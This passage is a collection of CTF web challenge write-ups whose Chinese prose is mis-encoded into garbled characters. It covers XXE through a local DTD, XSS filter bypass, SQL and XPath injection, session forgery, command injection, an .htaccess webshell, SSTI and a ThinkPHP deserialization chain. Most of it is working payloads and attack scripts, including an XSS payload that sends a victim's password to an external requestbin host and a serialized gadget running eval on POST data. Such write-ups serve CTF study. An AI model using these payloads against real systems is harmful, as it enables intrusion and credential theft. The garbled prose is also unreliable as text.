å…¥å‘ç°å›æ˜¾ç›¸åŒï¼Œè¯´æ˜flagæ–‡ä»¶å­˜åœ¨ï¼Œä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆè¯»å–å‘¢ï¼Ÿ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png)\n\nä¸€ä¸ªåˆ©ç”¨æœ¬åœ°DTDæ¥XXEè¾“å‡ºä»»ä½•æ–‡ä»¶å†…å®¹çš„å°[trick](https://mohemiv.com/tags/xxe/)\n\n> æœ¬è´¨ä¸Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æœ¬åœ°DTDæ–‡ä»¶çš„å®ä½“ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åœ¨å®Œå…¨åŠ è½½å®ƒä¹‹å‰å¯¹å®ƒè¿›è¡Œå®šä¹‰\n>\n> è€Œä¸”Linuxè®¾å¤‡å¯èƒ½åœ¨/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtdä¸­æœ‰ä¸€ä¸ªDTDæ–‡ä»¶ã€‚å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶åˆä¸€ä¸ªåä¸ºISOamsaçš„å®ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥å†™DTDä»£ç ã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ¶ä½œDTDä»£ç ã€‚\n\næ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå°è¯•æ”¾å…¥ä¸€ä¸ªé”™è¯¯çš„æ–‡ä»¶ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åè¢«å›æ˜¾å‡ºæ¥äº†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png)\n\næ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ„é€ DTDä»£ç ä½¿å¾—è¯»å–çš„æ–‡ä»¶åæ˜¯æˆ‘ä»¬å®é™…è¦è¯»å–çš„æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿å¾—æŠ¥é”™å¯¼è‡´å®é™…è¯»å–çš„æ–‡ä»¶å†…å®¹è¢«æ”¾å…¥è™šå‡çš„æ–‡ä»¶åä¸­è¢«çˆ†å‡º\n\nå¤§ä½¬æ„é€ å‡ºçš„xmlå¦‚ä¸‹\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE message[\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n    <!ENTITY &#x25; file SYSTEM \"file:///flag\">\n    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>\">\n    &#x25;eval;\n    &#x25;error;\n'>\n%local_dtd;\n]>\n```\n\n```xml-dtd\n<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n        <!ENTITY % file SYSTEM \"file:///flag\">\n        <!ENTITY % eval \"<!ENTITY % error SYSTEM 'file:///jlan/%file;'>\">\n        %eval;\n        %error;\n    '>\n    %local_dtd;\n]>\n```\n\n\n\n## [GWCTF 2019]mypassword\n\næœ‰åé¦ˆï¼Œåˆç†æ€€ç–‘XSS\n\n```php\n\t\tif(is_array($feedback)){\n\t\t\t\techo \"<script>alert('åé¦ˆä¸åˆæ³•');</script>\";\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t$blacklist = ['_','\\'','&','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];\n\t\t\tforeach ($blacklist as $val) {\n\t\t        while(true){\n\t\t            if(stripos($feedback,$val) !== false){\n\t\t                $feedback = str_ireplace($val,\"\",$feedback);\n\t\t            }else{\n\t\t                break;\n\t\t            }\n\t\t        }\n\t\t    }\n```\n\næ„é€ payload\n\n```javascript\n<incookieput type=\"text\" name=\"username\">\n<incookieput type=\"password\" name=\"password\">\n<scrcookieipt scookierc=\"./js/login.js\"></scrcookieipt>\n<scrcookieipt>\n    var psw = docucookiement.getcookieElementsByName(\"password\")[0].value;\n    docucookiement.locacookietion=\"http://http.requestbin.buuoj.cn/1is06vp1/?a=\"+psw;\n</scrcookieipt>\n```\n\n## [DDCTF 2019]homebrew event loop\n\næ¬£èµæºç \n\n```python\nfrom flask import Flask, session, request, Response\nimport urllib\n\napp = Flask(__name__)\napp.secret_key = '*********************'  # censored\nurl_prefix = '/d5afe1f66147e857'\n\n\ndef FLAG():\n    return '*********************'  # censored\n\n\ndef trigger_event(event):\n    session['log'].append(event)\n    if len(session['log']) > 5:\n        session['log'] = session['log'][-5:]\n    if type(event) == type([]):\n        request.event_queue += event\n    else:\n        request.event_queue.append(event)\n\n\ndef get_mid_str(haystack, prefix, postfix=None):\n    haystack = haystack[haystack.find(prefix)+len(prefix):]\n    if postfix is not None:\n        haystack = haystack[:haystack.find(postfix)]\n    return haystack\n\n\nclass RollBackException:\n    pass\n\n\ndef execute_event_loop():\n    valid_event_chars = set(\n        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')\n    resp = None\n    while len(request.event_queue) > 0:\n        # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\"\n        event = request.event_queue[0]\n        request.event_queue = request.event_queue[1:]\n        if not event.startswith(('action:', 'func:')):\n            continue\n        for c in event:\n            if c not in valid_event_chars:\n                break\n        else:\n            is_action = event[0] == 'a'\n            action = get_mid_str(event, ':', ';')\n            args = get_mid_str(event, action+';').split('#')\n            try:\n                event_handler = eval(\n                    action + ('_handler' if is_action else '_function'))\n                ret_val = event_handler(args)\n            except RollBackException:\n                if resp is None:\n                    resp = ''\n                resp += 'ERROR! All transactions have been cancelled. <br />'\n                resp += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n                session['num_items'] = request.prev_session['num_items']\n                session['points'] = request.prev_session['points']\n                break\n            except Exception, e:\n                if resp is None:\n                    resp = ''\n                # resp += str(e) # only for debugging\n                continue\n            if ret_val is not None:\n                if resp is None:\n                    resp = ret_val\n                else:\n                    resp += ret_val\n    if resp is None or resp == '':\n        resp = ('404 NOT FOUND', 404)\n    session.modified = True\n    return resp\n\n\n@app.route(url_prefix+'/')\ndef entry_point():\n    querystring = urllib.unquote(request.query_string)\n    request.event_queue = []\n    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:\n        querystring = 'action:index;False#False'\n    if 'num_items' not in session:\n        session['num_items'] = 0\n        session['points'] = 3\n        session['log'] = []\n    request.prev_session = dict(session)\n    trigger_event(querystring)\n    return execute_event_loop()\n\n# handlers/functions below --------------------------------------\n\n\ndef view_handler(args):\n    page = args[0]\n    html = ''\n    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(\n        session['num_items'], session['points'])\n    if page == 'index':\n        html += '<a href=\"./?action:index;True%23False\">View source code</a><br />'\n        html += '<a href=\"./?action:view;shop\">Go to e-shop</a><br />'\n        html += '<a href=\"./?action:view;reset\">Reset</a><br />'\n    elif page == 'shop':\n        html += '<a href=\"./?action:buy;1\">Buy a diamond (1 point)</a><br />'\n    elif page == 'reset':\n        del session['num_items']\n        html += 'Session reset.<br />'\n    html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n    return html\n\n\ndef index_handler(args):\n    bool_show_source = str(args[0])\n    bool_download_source = str(args[1])\n    if bool_show_source == 'True':\n\n        source = open('eventLoop.py', 'r')\n        html = ''\n        if bool_download_source != 'True':\n            html += '<a href=\"./?action:index;True%23True\">Download this .py file</a><br />'\n            html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n\n        for line in source:\n            if bool_download_source != 'True':\n                html += line.replace('&', '&amp;').replace('\\t', '&nbsp;'*4).replace(\n                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\\n', '<br />')\n            else:\n                html += line\n        source.close()\n\n        if bool_download_source == 'True':\n            headers = {}\n            headers['Content-Type'] = 'text/plain'\n            headers['Content-Disposition'] = 'attachment; filename=serve.py'\n            return Response(html, headers=headers)\n        else:\n            return html\n    else:\n        trigger_event('action:view;index')\n\n\ndef buy_handler(args):#å¢åŠ num_items\n    num_items = int(args[0])\n    if num_items <= 0:\n        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])\n    session['num_items'] += num_items\n    trigger_event(['func:consume_point;{}'.format(\n        num_items), 'action:view;index'])\n\n\ndef consume_point_function(args):\n    point_to_consume = int(args[0])\n    if session['points'] < point_to_consume:\n        raise RollBackException()\n    session['points'] -= point_to_consume\n\n\ndef show_flag_function(args):\n    flag = args[0]\n    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.\n    return 'You naughty boy! ;) <br />'\n\n\ndef get_flag_handler(args):#æœ€ç»ˆæ‹¿flag\n    if session['num_items'] >= 5:\n        # show_flag_function has been disabled, no worries\n        trigger_event('func:show_flag;' + FLAG())\n    trigger_event('action:view;index')\n\n\nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n```\n\nçœ‹æºç ä¸­å„ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œå†™åˆ°æ³¨é‡Šä¸­äº†ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœéœ€è¦æ‹¿flagå°±è¦è°ƒç”¨`get_flag_handler`ï¼Œè€Œå¦‚æœè¦æ‰§è¡Œå°±éœ€è¦æœ‰5ä¸ª`num_items`ï¼Œé€šè¿‡`buy_handler`å‡½æ•°æ¥å¢åŠ `num_items`ï¼Œä½†æ˜¯é’±ä¸å¤Ÿï¼Œæ­¤æ—¶æˆ‘ä»¬é€šè¿‡æ‰§è¡Œ`trigger_event`å‡½æ•°æ¥è¿›è¡Œå¤šå‡½æ•°æ‰§è¡Œï¼Œåœ¨è¿›è¡Œæ‰£è´¹ä¹‹å‰å°±æ‹¿å–åˆ°flag\n\n```\n?action:trigger_event#;action:buy;5#action:get_flag;#\n```\n\næ­¤æ—¶sessionå·²ç»è¢«å†™å…¥cookieäº†ï¼Œç”±äºè¯¥flaskç¨‹åºä¸­å¹¶æ²¡æœ‰ä½¿ç”¨æ•°æ®åº“ï¼Œæ‰€ä»¥sessionä¸­çš„å†…å®¹å®é™…ä¸Šæ˜¯å‚¨å­˜åœ¨æˆ‘ä»¬çš„cookieä¸­ï¼ˆ[æˆ³è¿™é‡Œçœ‹è¯¦æƒ…](https://www.leavesongs.com/PENETRATION/client-session-security.html)ï¼‰å¾—åˆ°sessionå†…å®¹å¹¶ä½¿ç”¨`flask-session-cookie-manager`å·¥å…·è¿›è¡Œè§£å¯†ï¼Œæ‹¿åˆ°flag\n\n## [RootersCTF2019]babyWeb\n\nSQLæ³¨å…¥ï¼Œè¿‡æ»¤å·²æé†’`UNION SLEEP ' \" OR - BENCHMARK`\n\nå…ˆç”¨order byæµ‹å‡ºåˆ—æ•°ï¼Œå†ç”¨ä¸‡èƒ½å¯†ç æå‡ºflag\n\n```\n1 || 1=1 limit 0,1\n```\n\n## [HFCTF2020]BabyUpload\n\næºç å…ˆæ‰”\n\n```php\n<?php\nerror_reporting(0);\nsession_save_path(\"/var/babyctf/\");\nsession_start();\nrequire_once \"/flag\";\nhighlight_file(__FILE__);\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\nelse{\n    $_SESSION['username'] ='guest';\n}\n$direction = filter_input(INPUT_POST, 'direction');\n$attr = filter_input(INPUT_POST, 'attr');\n$dir_path = \"/var/babyctf/\".$attr;\nif($attr===\"private\"){\n    $dir_path .= \"/\".$_SESSION['username'];\n}\nif($direction === \"upload\"){\n    try{\n        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){\n            throw new RuntimeException('invalid upload');\n        }\n        $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];\n        $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']);\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        @mkdir($dir_path, 0700, TRUE);\n        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){\n            $upload_result = \"uploaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $upload_result = $e->getMessage();\n    }\n} elseif ($direction === \"download\") {\n    try{\n        $filename = basename(filter_input(INPUT_POST, 'filename'));\n        $file_path = $dir_path.\"/\".$filename;\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        if(!file_exists($file_path)) {\n            throw new RuntimeException('file not exist');\n        }\n        header('Content-Type: application/force-download');\n        header('Content-Length: '.filesize($file_path));\n        header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"');\n        if(readfile($file_path)){\n            $download_result = \"downloaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $download_result = $e->getMessage();\n    }\n    exit;\n}\n?>\n```\n\næ–°çŸ¥è¯†ï¼šå¯ä»¥é€šè¿‡ä¸Šä¼ sessionæ–‡ä»¶ä¼ªé€ session\n\n> **å¯¹äºé€šè¿‡æ–‡ä»¶å­˜å‚¨sessionçš„ï¼Œä¸åŒçš„å¼•æ“å­˜å‚¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§**\n>\n> php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n> php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼\n> php_serialize(php>5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\nçœ‹ä»£ç ï¼Œæ‹¿åˆ°flagçš„æ¡ä»¶æ˜¯ï¼Œ`$_SESSION['username'] ==='admin'`å¹¶ä¸”`/var/babyctf/success.txt`æ–‡ä»¶å­˜åœ¨æˆ–`/var/babyctf/success.txt/`ç›®å½•å­˜åœ¨ï¼Œé¦–å…ˆå°è¯•è¯»å–sessionæ–‡ä»¶åˆ¤æ–­sessionå­˜å‚¨ç±»å‹\n\n```\n\\x08usernames:5:\"guest\";\n```\n\nè¯´æ˜æ˜¯php_binaryæ–¹å¼å­˜å‚¨çš„ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¼ªé€ sessionæ–‡ä»¶äº†ï¼Œé¢˜ç›®ä¸­æ–‡ä»¶ä¸Šä¼ åä¼šè¢«é‡å‘½åä¸º`æ–‡ä»¶å+_+æ–‡ä»¶å†…å®¹çš„sha256è®¡ç®—åçš„å†…å®¹`ï¼Œç¼–å†™è„šæœ¬è¿›è¡Œä¸Šä¼ \n\n```python\nimport hashlib\nfrom io import BytesIO\nimport requests\n\nurl = 'http://650ec886-b0bc-410f-bb3c-0b8dda942bee.node4.buuoj.cn:81/index.php'\n# ç¬¬ä¸€æ­¥:ä¸Šä¼ ä¼ªé€ çš„sessionæ–‡ä»¶\nfiles = {\"up_file\": (\"sess\", BytesIO('\\x08usernames:5:\"admin\";'.encode('utf-8')))}\ndata = {\n    'direction': 'upload',\n    'attr': ''\n}\nres = requests.post(url, data=data, files=files)\n\n# ç¬¬äºŒæ­¥:è·å–åé¢è¯·æ±‚æ—¶çš„session_id\nsession_id = hashlib.sha256('\\x08usernames:5:\"admin\";'.encode('utf-8')).hexdigest()\n\n# ç¬¬ä¸‰æ­¥:åœ¨/var/babyctf/ä¸‹åˆ›å»ºsuccess.txtç›®å½•\ndata1 = {\n    'attr': 'success.txt',\n    'direction': 'upload'\n}\nres1 = requests.post(url=url, data=data1, files=files)\n\n# ç¬¬å››æ­¥:é€šè¿‡ä¸Šé¢è·å–çš„session_idå‘èµ·è¯·æ±‚ï¼Œè·å–flag\ncookie = {\n    'PHPSESSID': session_id\n}\nflag_res = requests.post(url, cookies=cookie)\nprint(flag_res.text)\n```\n\n## [NPUCTF2020]ezlogin\n\nXXEæ˜¯ä½ å—XXE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png)\n\nå°è¯•äº†ä¸€éå‘ç°ä¸æ˜¯ï¼Œçœ‹wpæ˜¯[XPathæ³¨å…¥](https://www.tr0y.wang/2019/05/11/XPathæ³¨å…¥æŒ‡åŒ—/)ï¼Œè¿˜æœ‰ä¸€ä¸ª[ç›²æ³¨](https://xz.aliyun.com/t/7791)\n\nXPathä¸­è¡¨ç¤ºå†…å®¹çš„æ–¹æ³•ï¼ˆç±»ä¼¼Linuxä¸­çš„æ–‡ä»¶ç»“æ„ï¼‰\n\n```\n/ æ ¹èŠ‚ç‚¹\n/* æ ¹ç»“ç‚¹ä¸‹æ‰€æœ‰å­èŠ‚ç‚¹\n//*æ‰€æœ‰èŠ‚ç‚¹\n/root/* æ ¹ç»“ç‚¹rootä¸‹çš„æ‰€æœ‰å­èŠ‚ç‚¹\n```\n\nä¸€äº›å¥½ç”¨çš„XPathå‡½æ•°\n\n```\ncount è¿”å›ç»“æœçš„æ•°é‡\nstring-length è¿”å›å­—ç¬¦ä¸²é•¿åº¦\nname è¿”å›èŠ‚ç‚¹åç§°\nsubstring åŒMySQLä¸­substrçš„ç”¨æ³•\n\n```\n\næœ¬é¢˜ç»™ä¸ªå¤§ä½¬è„šæœ¬\n\n```python\nimport requests\nimport re\nimport time\n \nsession = requests.session()\nurl = \"http://391bfefa-8949-4535-8129-07c86723c6b9.node4.buuoj.cn\"\nchars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nhead = {\n    #'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',\n    'Content-Type': 'application/xml',\n    #\"Cookie\":\"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c\"\n        }\n \nfind = re.compile(r'<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />',re.S)\nresult = \"\"\n#çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°\npayload_1 = \"<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#çŒœæµ‹å­èŠ‚ç‚¹åç§°\npayload_2 = \"<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#çŒœæµ‹accountsçš„èŠ‚ç‚¹\npayload_3 =\"<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#çŒœæµ‹userèŠ‚ç‚¹\npayload_4 =\"<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#è·‘ç”¨æˆ·åå’Œå¯†ç \npayload_username =\"<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\npayload_password =\"<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n \ndef get_token():     #è·å–tokençš„å‡½æ•°\n    resp = session.get(url=url)  #å¦‚æœåœ¨è¿™é‡Œç”¨headersä¼šå¾—åˆ°è¶…æ—¶çš„ç•Œé¢\n    token = find.findall(resp.text)[0]\n    #print(token)\n    return token\n \nfor x in range(1,100):\n    for char in chars:\n        time.sleep(0.3)\n        token = get_token()\n        playload = payload_username.format(x, char, token)   #æ ¹æ®ä¸Šé¢çš„playloadæ¥æ”¹\n        #print(playload)\n        resp = session.post(url=url,headers=head, data=playload)\n        #print(resp.text)\n        if \"éæ³•æ“ä½œ\" in resp.text:\n            result += char\n            print(result)\n            break\n    if \"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\" in resp.text:\n        break\n```\n\nè·‘å‡ºç»“æœä¸ºadm1nå’Œmd5è§£å¯†åä¸ºgtfly123ï¼Œç™»å½•æˆåŠŸï¼Œå‘ç°ä¼ å‚ä¸­å«æœ‰æ–‡ä»¶å‚æ•°ï¼Œå°è¯•phpä¼ªåè®®è¯»å–ï¼Œè¢«æ‹¦æˆªï¼Œå¤§å°å†™ç»•è¿‡ï¼Œè¯»å–/flag\n\n## EasyBypass\n\næºç \n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n\n\nif(preg_match(\"/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is\", $comm1))\n    $comm1 = \"\";\nif(preg_match(\"/\\'|\\\"|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is\", $comm2))\n    $comm2 = \"\";\n\n$flag = \"#flag in /flag\";\n\n$comm1 = '\"' . $comm1 . '\"';\n$comm2 = '\"' . $comm2 . '\"';\n\n$cmd = \"file $comm1 $comm2\";\nsystem($cmd);\n?>\n```\n\nå‘½ä»¤1ï¼Œ2è¿‡æ»¤å†…å®¹å¹¶ä¸ç›¸åŒï¼Œå‘½ä»¤1ä¸­è¿‡æ»¤è¾ƒå°‘ï¼Œç›´æ¥ä»è¿™è¾¹ä¸‹æ‰‹ï¼Œé¦–å…ˆåŒå¼•å·é—­åˆï¼Œåˆ†å·ç»“æŸå‘½ä»¤ï¼Œtacè¯»å–æ–‡ä»¶ï¼Œé€šé…ç¬¦åŒ¹é…æ–‡ä»¶ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\n?comm1=\";tac /f*;\"\n```\n\n## [2020 æ–°æ˜¥çº¢åŒ…é¢˜]1\n\nè¿™é¢˜å’Œ**[EIS 2019]EzPOP**å®Œå…¨ä¸€è‡´ï¼Œå”¯ä¸€ä¸åŒå°±æ˜¯åœ¨æ–‡ä»¶åå¤„å¤šäº†è¿‡æ»¤\n\n```php\n    public function getCacheKey(string $name): string {\n        // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº\n        $cache_filename = $this->options['prefix'] . uniqid() . $name;\n        if(substr($cache_filename, -strlen('.php')) === '.php') {\n          die('?');\n        }\n        return $cache_filename;\n    }\n```\n\næ­¤å¤„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®åŠ ç›®å½•ç©¿è¶Šæ¥ç»•è¿‡ï¼Œä¼ å…¥`key = \"/../shell.php/.\";`ä¸”`options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';`ï¼Œæ­¤æ—¶å†…å®¹å˜ä¸ºï¼š`php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php`ç›´æ¥ç»•è¿‡\n\n## [ç¾ŠåŸæ¯2020]easyphp\n\næ–‡ä»¶ä¸Šä¼ .htaccessåŒ…å«åˆ©ç”¨ï¼Œé¦–å…ˆåœ¨htaccessæ–‡ä»¶ä¸­æ˜¯æœ‰æ³¨é‡Šç¬¦çš„ï¼Œå°±å®ƒ#ï¼Œä½†æ˜¯phpä¸è¯»è¿™ä¸ªçš„å•Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸Šä¼ .htaccessæ–‡ä»¶å¹¶åŒ…å«htaccesså¹¶ä¸”æ³¨é‡Šæ‰ä¸€å¥è¯æœ¨é©¬å³å¯ï¼Œæœ«å°¾è®°å¾—åŠ åæ–œæ æ¥è½¬è¯‘æ¢è¡Œï¼Œfileä½¿ç”¨\\æ¥ç»•è¿‡\n\n```\n php_value auto_prepend_fil\n \\e .htaccess\n #<?php system('tac /f*');?>\\\n```\n\n## [XNUCA2019Qualifier]EasyPHP\n\nè¿™ä¸ªéé¢„æœŸå’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¼ å…¥htaccessæ–‡ä»¶æ‰§è¡Œ\n\n## [pasecactf_2019]flask_ssti\n\nè¿‡æ»¤äº†'ï¼Œ.ï¼Œ_ï¼Œä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œç›´æ¥ç»™payloadäº†\n\n```\nnickname={{()[\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fbases\\x5f\\x5f\"][0][\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[127][\"\\x5f\\x5finit\\x5f\\x5f\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"popen\"](\"tac app*\")[\"read\"]()}}\n```\n\nä½†æ˜¯å¾ˆæ˜æ˜¾çœ‹åˆ°æºç ä¹Ÿæ²¡å•¥ç”¨ï¼Œå› ä¸ºflagå·²ç»è¢«é”€æ¯äº†\n\n```python\nimport random\nfrom flask import Flask, render_template_string, render_template, request\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'\n\n#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe\n'''\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\napp.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\n'''\n\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\nfile = open(\"/app/flag\", \"r\")\nflag = file.read()\nflag = flag[:42]\n\napp.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\nflag = \"\"\n\nos.remove(\"/app/flag\")\n```\n\nä½¿ç”¨è¿™ä¸ªå‡½æ•°åå‘è·‘å‡ºflagå³å¯\n\n## [å®‰æ´µæ¯ 2019]iamthinking\n\nwww.zipä¸‹è½½æºç \n\n```php\n<?php\nnamespace app\\controller;\nuse app\\BaseController;\n\nclass Index extends BaseController\n{\n    public function index()\n    {\n        \n        echo \"<img src='../test.jpg'\".\"/>\";\n        $paylaod = @$_GET['payload'];\n        if(isset($paylaod))\n        {\n            $url = parse_url($_SERVER['REQUEST_URI']);\n            parse_str($url['query'],$query);\n            foreach($query as $value)\n            {\n                if(preg_match(\"/^O/i\",$value))\n                {\n                    die('STOP HACKING');\n                    exit();\n                }\n            }\n            unserialize($paylaod);\n        }\n    }\n}\n```\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªååºåˆ—åŒ–ï¼Œæ²¡æœ‰å…¶ä»–çš„æ–¹æ³•äº†ï¼Œåªèƒ½çœ‹thinkPHPçš„ååºåˆ—åŒ–æ¼æ´äº†ï¼Œè‡³äºå…¶ä¸­çš„å¯¹ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç»•è¿‡ï¼Œçœ‹[è¿™é‡Œ](https://www.cnblogs.com/tr1ple/p/11137159.html)ï¼Œå…¶ä¸­thinkPHPçš„ååºåˆ—åŒ–é“¾å­å¯ä»¥ç”¨[è¿™ä¸ª](https://github.com/wh1t3p1g/phpggc)å·¥å…·ç”Ÿæˆ\n\næœ€ç»ˆpayload\n\n```\n//public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8